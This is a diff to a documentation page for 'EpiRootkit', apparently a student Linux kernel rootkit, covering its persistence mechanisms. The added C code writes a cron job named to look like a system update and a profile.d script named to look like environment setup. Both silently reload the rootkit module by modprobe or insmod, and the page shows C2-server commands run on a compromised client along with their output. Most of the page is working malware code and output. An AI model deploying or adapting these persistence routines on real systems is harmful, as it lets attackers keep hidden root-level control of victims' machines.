@@ -6,7 +6,7 @@ date: "2025-05-25T00:00:00+01:00"
 lastmod: "2025-05-25T00:00:00+01:00"
 draft: false
 toc: true
-weight: 54
+weight: 513
 ---
 
 # Persistence
@@ -98,24 +98,25 @@ c2-server$ exec Client-1 rm /etc/modules-load.d/epirootkit.conf
 
 ### How It Works
 - **File**: `/etc/cron.d/system-update` (we are stealthy hehe)
-- **Schedule**: Every minute check and load if not present
-- **Command**: `* * * * * root /sbin/modprobe epirootkit 2>/dev/null`
+- **Schedule**: Every 5 minutes check and load if not present
+- **Command**: `*/5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi' >/dev/null 2>&1`
 
 ### Implementation
 ```c
 int persistence_install_cron(void)
 {
     char cron_path[256];
-    char cron_content[512];
+    const char *cron_content = 
+        "# System update check - runs every 5 minutes\n"
+        PERSISTENCE_MARKER_START "\n"
+        "*/5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi' >/dev/null 2>&1\n"
+        PERSISTENCE_MARKER_END "\n";
+
     int ret;
 
-    snprintf(cron_path, sizeof(cron_path), "%s%s", CRON_DIR, EPIROOTKIT_CRON);
-    snprintf(cron_content, sizeof(cron_content),
-             "# EpiRootkit persistence cron job\n"
-             "* * * * * root /sbin/modprobe %s 2>/dev/null\n",
-             MODULE_NAME);
+    snprintf(cron_path, sizeof(cron_path), "%s%s", CRON_DIR, CRON_FILE);
     
-    ret = write_file(cron_path, cron_content);
+    ret = write_file(cron_path, cron_content, 0644);
     if (ret < 0)
         return ret;
 
@@ -130,8 +131,10 @@ int persistence_install_cron(void)
 c2-server$ exec Client-1 cat /etc/cron.d/system-update
 # Exit code: 0
 # Output:
-# # EpiRootkit persistence cron job
-# * * * * * root /sbin/modprobe epirootkit 2>/dev/null
+# # System update check - runs every 5 minutes
+# # EpiRootkit persistence - DO NOT REMOVE
+# */5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null; fi' >/dev/null 2>&1
+# # End EpiRootkit persistence
 
 # Check cron logs
 c2-server$ exec Client-1 grep epirootkit /var/log/syslog
@@ -149,20 +152,23 @@ c2-server$ exec Client-1 grep epirootkit /var/log/syslog
 int persistence_install_shell_profile(void)
 {
     char profile_path[256];
-    char profile_content[512];
+    const char *profile_content = 
+        "#!/bin/bash\n"
+        PERSISTENCE_MARKER_START "\n"
+        "# System environment initialization\n"
+        "if [ \"$(id -u)\" -eq 0 ]; then\n"
+        "    if ! lsmod | grep -q epirootkit 2>/dev/null; then\n"
+        "        modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null\n"
+        "    fi\n"
+        "fi\n"
+        PERSISTENCE_MARKER_END "\n";
+
     int ret;
 
     snprintf(profile_path, sizeof(profile_path), "%s%s", 
-             PROFILE_DIR, EPIROOTKIT_PROFILE);
-    snprintf(profile_content, sizeof(profile_content),
-             "#!/bin/bash\n"
-             "# EpiRootkit persistence via shell profile\n"
-             "if [ \"$(id -u)\" -eq 0 ]; then\n"
-             "    /sbin/modprobe %s 2>/dev/null\n"
-             "fi\n",
-             MODULE_NAME);
+             PROFILE_DIR, PROFILE_FILE);
     
-    ret = write_file(profile_path, profile_content);
+    ret = write_file(profile_path, profile_content, 0755);
     if (ret < 0)
         return ret;
 
@@ -178,10 +184,14 @@ c2-server$ exec Client-1 cat /etc/profile.d/system-env.sh
 # Exit code: 0
 # Output:
 # #!/bin/bash
-# # EpiRootkit persistence via shell profile
+# # EpiRootkit persistence - DO NOT REMOVE
+# # System environment initialization
 # if [ "$(id -u)" -eq 0 ]; then
-#     /sbin/modprobe epirootkit 2>/dev/null
+#     if ! lsmod | grep -q epirootkit 2>/dev/null; then
+#         modprobe epirootkit 2>/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2>/dev/null
+#     fi
 # fi
+# # End EpiRootkit persistence
 ```
 
 ## Technical Implementation
@@ -231,13 +241,10 @@ static int remove_file(const char *path)
 }
 ```
 
-
-
-
 ### Manual Testing
 ```bash
 # Test modules-load.d
-c2-server$ exec Client-1 systemd-modules-load /etc/modules-load.d/system-update.conf
+c2-server$ exec Client-1 systemd-modules-load /etc/modules-load.d/epirootkit.conf
 
 # Test cron job manually
 c2-server$ exec Client-1 /sbin/modprobe epirootkit
